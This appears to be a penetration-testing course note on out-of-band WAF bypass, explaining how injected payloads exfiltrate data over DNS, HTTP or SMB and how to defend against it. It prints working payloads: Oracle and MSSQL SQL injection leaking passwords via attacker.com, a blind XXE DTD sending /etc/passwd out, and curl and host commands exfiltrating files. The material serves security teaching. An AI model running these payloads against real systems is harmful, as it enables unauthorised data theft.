---
tags: [waf, evasion, bypass, vapt]
difficulty: advanced
module: "39 - WAF Bypass Techniques"
topic: "39.15 Out-of-Band Bypass"
---

# 39.15 Out-of-Band Bypass (OOB)

## Introduction

Out-of-Band (OOB) Bypass is a sophisticated evasion technique used by attackers when a Web Application Firewall (WAF) or egress filter heavily sanitizes or blocks the HTTP responses containing the results of an exploit. In many high-security environments, WAFs not only inspect incoming requests (Ingress) but also outgoing responses (Egress) to prevent data exfiltration. 

Instead of relying on the direct, synchronous HTTP response to retrieve the results of an attack (In-Band), an attacker forces the vulnerable backend system to initiate a separate, asynchronous outbound connection to an attacker-controlled server. This secondary channel (typically DNS, HTTP, ICMP, or SMB) bypasses the WAF's response inspection entirely, as the WAF is only monitoring the primary HTTP transaction between the client and the web server.

This note covers the mechanisms of OOB exploitation, various protocol channels used, and how to defend against these hard-to-detect exfiltration methods.

## Core Concepts

### In-Band vs. Out-of-Band

- **In-Band (Synchronous):** The attacker sends a malicious SQL injection payload. The database executes it, the application reflects the data in the HTML, and the WAF inspects the HTML. If the WAF sees thousands of credit card numbers in the response, it blocks the response (Data Loss Prevention - DLP).
- **Out-of-Band (Asynchronous):** The attacker sends a malicious payload. The WAF inspects the request and allows it (assuming evasion techniques were used). The payload executes, but instead of returning data in the HTTP response, the payload forces the backend server to make a DNS query like `admin_password.attacker.com`. The attacker monitors their DNS server, logs the `admin_password`, while the WAF sees a perfectly benign, empty HTTP response.

## ASCII Diagram: Out-of-Band Bypass Flow

```text
+-------------+                                   +-------------+                                    +-----------------+
|             |  1. HTTP Request with OOB Payload |             |  2. Forwards Request               |                 |
|   Attacker  | --------------------------------> |     WAF     | ---------------------------------> | Backend Server  |
|             |                                   |             |                                    | (Vulnerable)    |
+-------------+                                   +-------------+                                    +-----------------+
       ^                                                 |                                                    |
       |                                                 |  3. WAF Inspects Request (Pass)                    | 4. Executes Payload
       |                                                 |  6. WAF Inspects Benign Response (Pass)            |    Extracts Data
       |                                                 |                                                    |
       |  5. Out-of-Band DNS/HTTP Request                |                                                    |
       |  (e.g., ping secret_data.attacker.com)          |                                                    |
       +------------------------------------------------------------------------------------------------------+
```

## Exploitation Mechanics

OOB techniques are highly versatile and can be applied to almost any injection vulnerability, including SQLi, XXE, Command Injection, SSRF, and Deserialization.

### 1. OOB SQL Injection (SQLi)

When error-based or union-based SQLi is blocked by WAF egress rules, attackers use OOB SQLi to leak data.

**Oracle DB (using UTL_HTTP or UTL_INADDR):**
```sql
SELECT UTL_INADDR.get_host_address((SELECT password FROM users WHERE id=1)||'.attacker.com') FROM DUAL;
```
The Oracle database attempts to resolve the hostname `[password].attacker.com`. The attacker captures the password from the DNS query log on their authoritative name server for `attacker.com`.

**Microsoft SQL Server (xp_dirtree):**
```sql
DECLARE @data VARCHAR(1024);
SELECT @data = password FROM users WHERE id=1;
EXEC('master..xp_dirtree "\\' + @data + '.attacker.com\share"');
```
This forces an outbound SMB connection/DNS resolution, cleanly exfiltrating the password through the network without ever appearing in an HTTP response.

### 2. OOB XML External Entity (XXE)

Blind XXE is a classic use case for OOB evasion. If the WAF blocks the reflection of `/etc/passwd` in the HTTP response, the attacker uses an external DTD to exfiltrate the file via HTTP or FTP.

**Attacker DTD (`http://attacker.com/evil.dtd`):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**Payload Sent to WAF:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
<root>test</root>
```
The WAF only sees the initial XML requesting an external DTD. The backend server fetches the DTD, reads `/etc/passwd`, and sends it via an HTTP GET request to the attacker's server, entirely bypassing the WAF's egress filter.

### 3. OOB Command Injection

If an attacker achieves command injection but the WAF prevents the `stdout` of the command from reaching the browser:

**Data Exfiltration via DNS:**
```bash
host $(whoami).attacker.com
```
**Data Exfiltration via HTTP:**
```bash
curl http://attacker.com/log?data=$(base64 /etc/passwd)
```
The primary HTTP response might simply be "Command executing..." or a generic 200 OK, satisfying the WAF, while the actual sensitive data traverses a completely different network route to the attacker.

## Tooling for OOB Attacks

- **Burp Suite Collaborator:** An enterprise-grade tool integrated into Burp Suite designed specifically to catch OOB interactions (DNS, HTTP, SMTP). It automatically generates unique payload domains and correlates incoming connections with specific requests.
- **Project Discovery Interactsh:** An open-source, highly scalable alternative to Burp Collaborator, ideal for CLI automation and CI/CD pipeline integration.
- **DNSChef / Custom BIND Servers:** For manual, highly tailored OOB exfiltration via DNS tunneling and custom response generation.

## Mitigation and Defense Strategies

### 1. Strict Egress Filtering
The most effective defense against OOB attacks is robust network-level egress filtering.
- Backend application servers and database servers should **never** have unrestricted outbound internet access.
- Firewalls should block all outbound HTTP, FTP, SMB, and ICMP traffic from backend servers unless explicitly required and allowlisted.
- Internal DNS servers should not recursively resolve external domains for database servers or internal microservices, preventing DNS exfiltration.

### 2. Disable Dangerous Functions
- **Databases:** Revoke access to advanced network functions. In MSSQL, disable `xp_dirtree` and `xp_cmdshell`. In Oracle, restrict `UTL_HTTP` and `UTL_TCP` to authorized packages only.
- **XML Parsers:** Disable External Entity Resolution entirely (`setFeature("http://xml.org/sax/features/external-general-entities", false)`).

### 3. WAF and RASP Integration
While WAFs struggle with OOB because they lack visibility into backend network traffic, Runtime Application Self-Protection (RASP) agents run inside the application. RASP can intercept outbound network calls initiated by the application (e.g., Java's `HttpURLConnection` or Node's `http.request()`) and block them if they originate from untrusted execution contexts or point to unauthorized domains.

### 4. DNS Query Monitoring
Implement security monitoring (SIEM/XDR) on internal DNS resolvers. Alert on abnormally long DNS queries, queries containing hex/base64 strings, or frequent queries to newly registered or suspicious domains, which are strong indicators of OOB data exfiltration attempts.

## Chaining Opportunities
- **Blind SQL Injection:** Exploiting databases without visible errors or reflected data.
- **Blind XXE:** Reading local files or SSRF when XML is parsed but not returned.
- **Blind Command Injection:** Executing commands and verifying execution asynchronously.
- **Log4Shell (CVE-2021-44228):** The quintessential OOB vulnerability, relying on outbound LDAP/RMI connections to fetch malicious Java classes.

## Related Notes
- [[14 - Wildcard Bypass]]
- [[21 - XML External Entity (XXE)]]
- [[22 - Advanced SQL Injection]]
- [[17 - Command Injection Evasion]]
- [[26 - Log4j Vulnerabilities]]
